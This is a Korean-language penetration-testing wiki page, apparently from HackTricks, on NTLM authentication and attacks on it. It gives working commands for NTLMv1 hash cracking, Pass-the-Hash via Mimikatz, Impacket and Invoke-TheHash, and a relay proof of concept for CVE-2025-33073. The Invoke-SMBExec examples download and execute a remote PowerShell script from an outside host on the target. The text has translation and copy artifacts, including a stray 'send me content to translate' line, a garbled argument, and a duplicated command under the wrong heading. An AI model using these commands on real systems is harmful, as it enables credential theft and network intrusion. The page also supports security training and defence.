# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 기본 정보

**Windows XP 및 Server 2003**이 운영되는 환경에서는 LM (Lan Manager) 해시를 사용하지만, 이는 쉽게 손상될 수 있다는 점이 널리 알려져 있습니다. 특정 LM 해시인 `AAD3B435B51404EEAAD3B435B51404EE`는 LM을 사용하지 않는 경우를 나타내며, 빈 문자열의 해시입니다.

기본적으로 **Kerberos** 인증 프로토콜이 주된 인증 방식으로 사용됩니다. 다음과 같은 특정 상황에서는 NTLM (NT LAN Manager)이 사용됩니다. Active Directory가 없는 경우, 도메인이 존재하지 않는 경우, 잘못된 구성으로 Kerberos가 작동하지 않는 경우, 또는 유효한 호스트 이름 대신 IP 주소를 사용해 연결을 시도하는 경우입니다.

네트워크 패킷에 **"NTLMSSP"** 헤더가 있으면 NTLM 인증 프로세스가 진행 중임을 나타냅니다.

인증 프로토콜인 LM, NTLMv1, NTLMv2는 `%windir%\Windows\System32\msv1\_0.dll`에 있는 특정 DLL을 통해 지원됩니다.

**주요 사항**:

- LM 해시는 취약하며, 빈 LM 해시 (`AAD3B435B51404EEAAD3B435B51404EE`)는 LM을 사용하지 않음을 의미합니다.
- Kerberos가 기본 인증 방식이며, 특정 조건에서만 NTLM을 사용합니다.
- NTLM 인증 패킷은 "NTLMSSP" 헤더로 식별할 수 있습니다.
- LM, NTLMv1, NTLMv2 프로토콜은 시스템 파일 `msv1\_0.dll`에서 지원됩니다.

## LM, NTLMv1 및 NTLMv2

사용할 프로토콜을 확인하고 구성할 수 있습니다.

### GUI

_secpol.msc_를 실행합니다 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 수준은 0부터 5까지 총 6개입니다.

![LM, NTLMv1 및 NTLMv2 - GUI: secpol.msc 실행 - Local policies - Security Options - Network Security: LAN Manager authentication level. 수준은 0부터 5까지 총 6개입니다](<../../images/image (919).png>)

### Registry

이렇게 하면 수준이 5로 설정됩니다:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

가능한 값:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## 기본 NTLM 도메인 인증 방식

1. **사용자**가 **자격 증명**을 입력합니다.
2. 클라이언트 머신이 **도메인 이름**과 **사용자 이름**을 전송하여 **인증 요청을 보냅니다**.
3. **서버**가 **challenge**를 보냅니다.
4. **클라이언트가** 비밀번호 hash를 key로 사용해 **challenge를 암호화**하고, 그 결과를 response로 보냅니다.
5. **서버는** **도메인 이름, 사용자 이름, challenge, response**를 **도메인 컨트롤러**에 보냅니다. Active Directory가 구성되어 있지 않거나 도메인 이름이 서버의 이름인 경우, 자격 증명은 **로컬에서 확인됩니다**.
6. **도메인 컨트롤러는 모든 정보가 올바른지 확인**한 뒤 서버에 정보를 보냅니다.

**서버**와 **도메인 컨트롤러**는 Netlogon 서버를 통해 **Secure Channel**을 만들 수 있습니다. 도메인 컨트롤러는 서버의 비밀번호를 알고 있기 때문입니다(비밀번호는 **NTDS.DIT** db에 저장되어 있습니다).

### 로컬 NTLM 인증 방식

인증 방식은 **앞서 설명한 방식과 같지만**, **서버**는 **SAM** 파일에서 인증을 시도하는 **사용자의 hash**를 알고 있습니다. 따라서 도메인 컨트롤러에 요청하는 대신 **서버가 직접** 사용자의 인증 가능 여부를 확인합니다.

### NTLMv1 Challenge

**challenge 길이는 8 bytes**이고 **response 길이는 24 bytes**입니다.

**NT hash(16bytes)**는 각각 7bytes인 **3개 부분**으로 나뉩니다(7B + 7B + (2B+0x00\*5)). **마지막 부분은 0으로 채워집니다**. 그런 다음 각 부분을 사용해 **challenge를 별도로 암호화**하고, 암호화된 **결과**를 **이어 붙입니다**. 총 길이: 8B + 8B + 8B = 24Bytes.

**문제점**:

- **무작위성 부족**
- 3개 부분을 **각각 공격**하여 NT hash를 찾을 수 있음
- **DES는 crack 가능**
- 세 번째 key는 항상 **0 다섯 개**로 구성됨
- **동일한 challenge**가 주어지면 **response도 동일**합니다. 따라서 피해자에게 "**1122334455667788**" 문자열을 **challenge**로 제공하고, 미리 계산된 rainbow tables를 사용해 response를 공격할 수 있습니다.

### NTLMv1 attack

Unconstrained delegation은 최신 환경에서 흔하지 않지만, 접근 가능한 **Print Spooler 서비스**를 악용해 해당 호스트로 인증을 강제할 수 있습니다.

이미 보유한 AD 자격 증명/세션을 악용해 **프린터가 사용자가 제어하는 호스트에 인증하도록 요청**할 수 있습니다. 그런 다음 `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용해 **인증 challenge를 1122334455667788로 설정**하고, 인증 시도를 캡처합니다. 인증에 **NTLMv1**이 사용됐다면 이를 **crack할 수 있습니다**.\
`responder`를 사용한다면 **인증을 downgrade**하기 위해 **`--lm` flag**를 사용해 볼 수 있습니다.\
_이 기법을 사용하려면 인증에 NTLMv1을 사용해야 합니다(NTLMv2는 사용할 수 없습니다)._

프린터는 인증에 컴퓨터 계정을 사용하며, 컴퓨터 계정에는 **길고 무작위적인 비밀번호**가 설정되어 있어 일반적인 **dictionaries**를 사용해서는 **아마 crack할 수 없다는 점**을 기억하세요. 하지만 **NTLMv1** 인증은 **DES를 사용**하므로([자세한 정보](#ntlmv1-challenge)), DES crack 전용 서비스를 사용하면 crack할 수 있습니다(예: [https://crack.sh/](https://crack.sh) 또는 [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1은 캡처한 NTLMv1 메시지를 Hashcat에 적합한 형식으로 변환하는 [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi)을 사용해 공격할 수도 있습니다.<sup>[[1]](#references)</sup>

명령어

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

다음과 같이 출력됩니다:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

번역할 내용을 보내 주세요.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcat을 실행하세요( hashtopolis 같은 도구를 통해 분산 실행하는 것이 가장 좋습니다). 그렇지 않으면 며칠이 걸립니다.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

이 경우 비밀번호가 password라는 것을 알고 있으므로, 데모 목적으로 편법을 사용하겠습니다:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

이제 hashcat-utilities를 사용해 크랙된 des 키를 NTLM 해시의 일부로 변환해야 합니다:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

마지막으로 마지막 부분:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

함께 결합하세요:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**challenge 길이는 8바이트이며**, **response 2개가 전송됩니다**. 하나는 **길이가 24바이트**이고, **나머지 하나**의 길이는 **가변적**입니다.

**첫 번째 response**는 **client와 domain으로 구성된 문자열**을 **키**로 사용하고, **NT hash**의 **MD4 hash**를 **키**로 사용해 **HMAC_MD5**로 암호화하여 생성합니다. 그런 다음 이 **결과**를 **키**로 사용해 **challenge**를 **HMAC_MD5**로 암호화합니다. 여기에 **8바이트 client challenge**를 추가합니다. 총 길이는 24바이트입니다.

**두 번째 response**는 **여러 값**(새 client challenge, **replay attack**을 방지하기 위한 **timestamp** 등)을 사용해 생성됩니다.

성공적인 인증 교환이 포함된 **PCAP**이 있다면 domain, username, server challenge, NTLMv2 response를 추출하고, 캡처를 Hashcat 형식으로 변환한 뒤 mode `5600`을 사용해 password 복구를 시도합니다. 보관된 실습 안내서에는 패킷 필드 추출 절차가 있고, Hashcat 예제에는 현재 지원되는 형식이 나와 있습니다.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**피해자의 hash를 확보했다면** 이를 사용해 피해자를 **사칭**할 수 있습니다.\
해당 **hash를 사용해 NTLM 인증을 수행하는** **도구**를 사용하거나, 새 **sessionlogon**을 생성한 다음 해당 **hash를 LSASS에 주입**할 수 있습니다. 그러면 **NTLM 인증이 수행될 때마다** 해당 **hash가 사용됩니다.** 후자의 방법이 mimikatz가 사용하는 방식입니다.

**Computer 계정을 사용해도 Pass-the-Hash 공격을 수행할 수 있다는 점을 기억하세요.**

### **Mimikatz**

**관리자 권한으로 실행해야 합니다**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

This는 현재 로컬 사용자로 프로세스를 실행하며, LSASS는 제공된 자격 증명을 아웃바운드 네트워크 로그온에 연결합니다. 그러면 일반 텍스트 비밀번호를 몰라도 `runas /netonly`와 비슷하게 제공된 사용자로 네트워크 리소스에 액세스할 수 있습니다.

### Pass-the-Hash from linux

Linux에서 Pass-the-Hash를 사용해 Windows 머신에서 코드 실행을 수행할 수 있습니다.\
[**실제 Pass-the-Hash 실행 예제를 확인하세요.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows 컴파일 도구

[Windows용 impacket 바이너리는 여기에서 다운로드할 수 있습니다](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (이 경우 명령을 지정해야 합니다. cmd.exe와 powershell.exe는 대화형 셸을 얻는 데 사용할 수 없습니다.)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 그 외에도 여러 Impacket 바이너리가 있습니다...

### Invoke-TheHash

여기에서 PowerShell 스크립트를 받을 수 있습니다: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

이 함수는 앞서 설명한 모드들을 결합합니다. **여러 호스트**를 지정하고, 선택한 대상을 제외하며, _SMBExec, WMIExec, SMBClient,_ 또는 _SMBEnum_을 선택할 수 있습니다. _**Command**_ 매개변수 없이 **SMBExec** 또는 **WMIExec**을 선택하면 충분한 권한이 있는지만 확인합니다.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**관리자 권한으로 실행해야 합니다**

이 도구는 mimikatz와 동일한 작업을 수행합니다(LSASS 메모리 수정).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### 사용자 이름과 암호를 사용한 수동 Windows 원격 실행


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows 호스트에서 자격 증명 추출하기

자세한 내용은 [**Windows 자격 증명 탈취**](../stealing-credentials/README.md)를 참조하세요.

## Internal Monologue 공격

Internal Monologue Attack은 공격자가 **LSASS 프로세스와 직접 상호작용하지 않고도** 피해자의 컴퓨터에서 NTLM 해시를 가져올 수 있는 은밀한 자격 증명 추출 기법입니다. 메모리에서 해시를 직접 읽어 오므로 엔드포인트 보안 솔루션이나 Credential Guard에 자주 차단되는 Mimikatz와 달리, 이 공격은 **Security Support Provider Interface(SSPI)를 통해 NTLM 인증 패키지(MSV1_0)를 로컬에서 호출**합니다. 공격자는 먼저 **NTLM 설정**(예: LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic)을 낮춰 NetNTLMv1을 허용합니다. 그런 다음 실행 중인 프로세스에서 얻은 기존 사용자 토큰을 가장하고, 로컬에서 NTLM 인증을 트리거해 알려진 challenge를 사용한 NetNTLMv1 응답을 생성합니다.<sup>[[4]](#references)</sup>

이러한 NetNTLMv1 응답을 캡처한 후, 공격자는 **사전 계산된 레인보우 테이블**을 사용해 원래 NTLM 해시를 빠르게 복구하고, 이를 이용해 lateral movement를 위한 추가 Pass-the-Hash 공격을 수행할 수 있습니다. 중요한 점은 Internal Monologue Attack이 네트워크 트래픽을 생성하거나, 코드를 삽입하거나, 직접 메모리 덤프를 생성하지 않아 은밀하게 수행된다는 것입니다. 따라서 Mimikatz 같은 기존 기법보다 방어자가 탐지하기 어렵습니다.

보안 정책이 강제되어 NetNTLMv1이 허용되지 않으면 공격자는 NetNTLMv1 응답을 가져오지 못할 수 있습니다.

이 경우를 처리하기 위해 Internal Monologue 도구가 업데이트되었습니다. `AcceptSecurityContext()`를 사용해 서버 토큰을 동적으로 획득하여 NetNTLMv1이 실패하더라도 **NetNTLMv2 응답을 캡처**할 수 있습니다. NetNTLMv2는 크래킹하기 훨씬 어렵지만, 제한적인 경우 relay 공격이나 오프라인 brute-force 공격의 경로를 제공합니다.

PoC는 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**에서 확인할 수 있습니다.<sup>[[4]](#references)</sup>

## NTLM Relay 및 Responder

**이러한 공격을 수행하는 방법에 대한 자세한 가이드는 여기에서 확인하세요:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 네트워크 캡처에서 NTLM challenge 파싱하기

**다음을 사용할 수 있습니다:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## 직렬화된 SPN을 통한 NTLM 및 Kerberos *Reflection* (CVE-2025-33073)

Windows에는 호스트에서 시작된 NTLM(또는 Kerberos) 인증을 **동일한** 호스트로 relay하여 SYSTEM 권한을 얻는 *reflection* 공격을 방지하기 위한 여러 완화책이 있습니다.

Microsoft는 MS08-068(SMB→SMB), MS09-013(HTTP→SMB), MS15-076(DCOM→DCOM) 및 이후 패치로 대부분의 공개 공격 체인을 차단했습니다. 그러나 **CVE-2025-33073**은 *marshalled*(직렬화된) target-info를 포함하는 Service Principal Name(SPN)을 **SMB 클라이언트가 잘라내는 방식**을 악용하면 보호 기능을 여전히 우회할 수 있음을 보여줍니다.<sup>[[5]](#references)[[6]](#references)</sup>

### 버그 요약
1. 공격자는 marshalled SPN을 인코딩한 레이블이 포함된 **DNS A 레코드**를 등록합니다. 예:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 피해자가 해당 호스트 이름으로 인증하도록 유도됩니다(PetitPotam, DFSCoerce 등).
3. SMB 클라이언트가 target 문자열 `cifs/srv11UWhRCAAAAA…`를 `lsasrv!LsapCheckMarshalledTargetInfo`에 전달하면, `CredUnmarshalTargetInfo` 호출이 직렬화된 blob을 **제거**하여 **`cifs/srv1`**만 남깁니다.
4. 이제 `msv1_0!SspIsTargetLocalhost`(또는 이에 해당하는 Kerberos 함수)는 짧아진 호스트 부분이 컴퓨터 이름(`SRV1`)과 일치하므로 해당 대상을 *localhost*로 간주합니다.
5. 그 결과 서버는 `NTLMSSP_NEGOTIATE_LOCAL_CALL`을 설정하고 **LSASS의 SYSTEM access-token**을 컨텍스트에 삽입합니다(Kerberos의 경우 SYSTEM으로 표시된 subsession key가 생성됩니다).
6. `ntlmrelayx.py` **또는** `krbrelayx.py`로 해당 인증을 relay하면 동일한 호스트에서 모든 SYSTEM 권한을 얻을 수 있습니다.<sup>[[5]](#references)</sup>

### 간단한 PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### 패치 및 완화 조치
* **CVE-2025-33073**용 KB 패치는 `mrxsmb.sys::SmbCeCreateSrvCall`에 검사를 추가해, 대상에 마샬링된 정보가 포함된 SMB 연결을 차단합니다(`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay 대상에서 **SMB signing**을 적용하세요. 다른 대상의 경우 해당 프로토콜 자체의 signing 또는 Extended Protection 요구 사항과 패치 수준을 확인하세요. SMB signing만으로는 HTTPS WinRM relay 가능 여부를 판단할 수 없습니다.
* `*<base64>...*`와 유사한 DNS 레코드를 모니터링하고, 강제 인증 벡터(PetitPotam, DFSCoerce, AuthIP...)를 차단하세요.

### 탐지 아이디어
* 클라이언트 IP ≠ 서버 IP인 `NTLMSSP_NEGOTIATE_LOCAL_CALL`이 포함된 네트워크 캡처
* 서브세션 키가 포함되고 클라이언트 주체가 호스트 이름과 일치하는 Kerberos AP-REQ
* Windows Event 4624/4648 SYSTEM 로그온 직후 같은 호스트에서 발생하는 원격 SMB 쓰기.<sup>[[5]](#references)</sup>

직렬화된 대상 정보 DNS 이름은 강제 인증을 공격자 쪽으로 유도해 AD CS 웹 등록 엔드포인트에 대한 **크로스 프로토콜 relay**를 수행할 수도 있습니다. 이는 동일 호스트 반사와는 별개의 결과입니다. [ESC8 등록 조건](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS 쓰기 권한, 강제 인증 경로, 대상의 패치 수준을 각각 별도로 평가해야 합니다.

**2026년 3월**의 로컬 반사 변형은 **SMB 임의 포트**와 **TCP 연결 재사용**을 악용해 `NT AUTHORITY\SYSTEM` 권한에 도달합니다. 자세한 내용은 다음을 참조하세요.

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 멀티툴](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat 예제 해시 – NetNTLMv2 (모드 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash 유틸리티](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS에 접근하지 않고 NTLM 해시 가져오기](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection은 끝났다, NTLM Reflection 만세!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 해시 크래킹 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
